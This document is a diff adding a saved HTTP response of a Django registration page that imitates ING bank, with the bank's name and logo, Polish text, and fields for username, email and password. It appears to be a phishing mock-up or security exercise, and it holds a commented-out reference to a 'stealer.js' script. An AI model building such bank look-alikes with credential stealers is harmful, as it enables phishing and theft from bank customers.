@@ -1,0 +1,95 @@
+HTTP/1.1 200 OK
+Date: Wed, 12 Dec 2018 13:07:23 GMT
+Server: WSGIServer/0.2 CPython/3.6.7
+Content-Type: text/html; charset=utf-8
+X-Frame-Options: SAMEORIGIN
+Content-Length: 5001
+Vary: Cookie
+
+
+<!DOCTYPE html>
+<html>
+<head>
+
+	 <!-- Required meta tags -->
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+
+    <!-- Bootstrap CSS -->
+    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css" integrity="sha384-Gn5384xqQ1aoWXA+058RXPxPg6fy4IWvTNh0E263XmFcJlSAwiGgFAW/dAiS6JXm" crossorigin="anonymous">
+
+    <link rel="stylesheet" type="text/css" href="/static/banksite/main.css">
+
+	
+		<title>ING</title>
+	
+</head>
+<body>
+	<div class="main-header">
+		<header class="site-header">
+		  <nav class="navbar navbar-expand-md navbar-dark bg-steel fixed-top">
+		    <div class="container">
+					
+					<img class="logo" src="/static/banksite/ing.png"/>
+		      <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarToggle" aria-controls="navbarToggle" aria-expanded="false" aria-label="Toggle navigation">
+		      <span class="navbar-toggler-icon"></span>
+		      </button>
+		      <div class="collapse navbar-collapse" id="navbarToggle">
+		        <div class="navbar-nav mr-auto">
+		          <a class="nav-item nav-link" href="/">Strona główna</a>
+		          <a class="nav-item nav-link" href="/about/">O nas</a>
+		        </div>
+		        <!-- Navbar Right Side -->
+		        <div class="navbar-nav">
+		        	
+				        <a class="nav-item nav-link" href="/login/">Logowanie</a>
+				        <a class="nav-item nav-link" href="/register/">Rejestracja</a>
+			        
+		        </div>
+		      </div>
+		    </div>
+		  </nav>
+		</header>
+	</div>
+
+	<main role="main" class="main-cont">
+	  <div class="row">
+	    <div class="col-md-12">
+	    	
+	      	
+	<div class="content-section">
+		<form method="POST">
+			<input type="hidden" name="csrfmiddlewaretoken" value="0Pm5VFQOLT40w3v9Er3FHR1bl2oAuT5Bis9dahseGojvlUjKWe0AIdsCPF7LIYcy">
+			<fieldset class="form-group">
+				<legend class="border-bottom mb-4">Dołącz do nas!</legend>
+				
+
+<div id="div_id_username" class="form-group"> <label for="id_username" class="col-form-label  requiredField">
+                Username<span class="asteriskField">*</span> </label> <div class=""> <input type="text" name="username" maxlength="150" autofocus class="textinput textInput form-control" required id="id_username"> <small id="hint_id_username" class="form-text text-muted">Required. 150 characters or fewer. Letters, digits and @/./+/-/_ only.</small> </div> </div> <div id="div_id_email" class="form-group"> <label for="id_email" class="col-form-label  requiredField">
+                Email<span class="asteriskField">*</span> </label> <div class=""> <input type="email" name="email" class="emailinput form-control" required id="id_email"> </div> </div> <div id="div_id_password1" class="form-group"> <label for="id_password1" class="col-form-label  requiredField">
+                Password<span class="asteriskField">*</span> </label> <div class=""> <input type="password" name="password1" class="textinput textInput form-control" required id="id_password1"> <small id="hint_id_password1" class="form-text text-muted"><ul><li>Your password can&#39;t be too similar to your other personal information.</li><li>Your password must contain at least 8 characters.</li><li>Your password can&#39;t be a commonly used password.</li><li>Your password can&#39;t be entirely numeric.</li></ul></small> </div> </div> <div id="div_id_password2" class="form-group"> <label for="id_password2" class="col-form-label  requiredField">
+                Password confirmation<span class="asteriskField">*</span> </label> <div class=""> <input type="password" name="password2" class="textinput textInput form-control" required id="id_password2"> <small id="hint_id_password2" class="form-text text-muted">Enter the same password as before, for verification.</small> </div> </div>
+
+			</fieldset>
+			<div class="form-group">
+                <button class="btn btn-outline-info" type="submit">Rejestracja</button>
+            </div>
+		</form>
+		<div class="border-top pt-3">
+            <small class="text-muted">
+                Masz już konto? <a class="ml-2" href="/login/">Zaloguj się</a>
+            </small>
+        </div>
+	</div>
+
+	    </div>
+	  </div>
+	</main>
+	<!-- Optional JavaScript -->
+    <!-- jQuery first, then Popper.js, then Bootstrap JS -->
+		<!--script src="/static/js/stealer.js"></script-->
+    <script src="https://code.jquery.com/jquery-3.2.1.slim.min.js" integrity="sha384-KJ3o2DKtIkvYIK3UENzmM7KCkRr/rE9/Qpg6aAZGJwFDMVNA/GpGFF93hXpG5KkN" crossorigin="anonymous"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.9/umd/popper.min.js" integrity="sha384-ApNbgh9B+Y1QKtv3Rn7W3mgPxhU9K/ScQsAP7hUibX39j7fakFPskvXusvfa0b4Q" crossorigin="anonymous"></script>
+    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js" integrity="sha384-JZR6Spejh4U02d8jOt6vLEHfe/JQGiRRSQQxSfFWpi1MquVdAyjUar5+76PVCmYl" crossorigin="anonymous"></script>
+</body>
+</html>
